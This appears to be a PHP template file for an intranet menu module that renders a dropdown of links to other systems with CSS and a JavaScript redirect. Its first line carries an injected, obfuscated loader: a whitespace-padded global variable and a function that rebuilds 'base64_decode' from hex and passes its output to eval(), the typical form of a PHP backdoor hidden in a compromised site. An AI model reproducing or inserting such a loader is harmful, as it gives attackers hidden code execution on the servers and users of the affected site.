<?php /*versio:3.02*/ $GLOBALS["yminpd"]="";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php
$this->Config(array(
	'config' => array(
	)
));
?>

<?php
	
	$Top_menus_left = getMenuItems(0,array("MenuName='LinkOtherSys'"));

?>
<style>

#m_LinkOtherSys.x-modbox .modboxin {
	padding: 0px;
	border: none;
	background-color:#f3f3f3;
}
#m_LinkOtherSys.x-modbox .modtitle {
	border: none;
	height:34px;
	/*background: url(templates/intranet/images/hsri_box_right_header.jpg) left top no-repeat;*/
}
#m_LinkOtherSys.x-modbox .modtitle_text {
	font-size: 14px;
	/*color: #2e5888;*/
	padding-bottom: 0px;
	display: block;
	line-height:30px;
	background-image:none;
}
#m_LinkOtherSys.x-modbox .modboxin{
	background: url(templates/intranet/images/hsri_box_footer.jpg) left bottom repeat-x;
	padding-top:10px;
	padding-bottom:15px;
	background-color:#f3f3f3;
	
}
#m_LinkOtherSys .f-menu-left .menu-level-1{
	background:none;
}

</style>

<div class="f-menu-left">
<ul class="menu-level-1">
<?php foreach( $Top_menus_left as $tml ){?>
    <?php $Menu_left_level2 = getMenuItems( $tml->MenuId );
	?>
    <?php if(strtolower($tml->DisplayType) == 'dropdown'){
		$cbMenus = new stdClass();
		$cbMenus->MenuName = '=== กรุณาเลือกระบบ ===';
		$cbMenus->MenuId = 0;
		
		foreach( $Menu_left_level2 as $SubMenu ){
			$SubMenu->Link = genMenu($SubMenu);
			$Submenus[] = $SubMenu;
					//  level 3
					$Menu_left_level3 = getMenuItems( $SubMenu->MenuId );
					//if($Menu_left_level3) $SubMenu->Link = '';
					foreach( $Menu_left_level3 as $SubMenu3 ){
						$SubMenu3->Link = genMenu($SubMenu3);
						$SubMenu3->MenuName = ' - '.$SubMenu3->MenuName;
						$Submenus[] = $SubMenu3;
					}
					//
		}
		
		$Menu_left_level2 = array_merge(array($cbMenus),$Submenus);
		echo '<div class="select1" id="sub-menu-'.$tml->MenuId.'"><span>';
		echo clssHTML::selectList($Menu_left_level2,'mitemid','class="menu-select" onChange="SwitchAlies(this.value)"','Link','MenuName',genMenuPath().MenuValue());
		echo '</span></div>';
		
	}?>
    
<?php }?>
</ul>
</div>
<script>
	function SwitchAlies(sys)
	{
		//alert(sys);
		window.location.href = sys;
	}
</script>
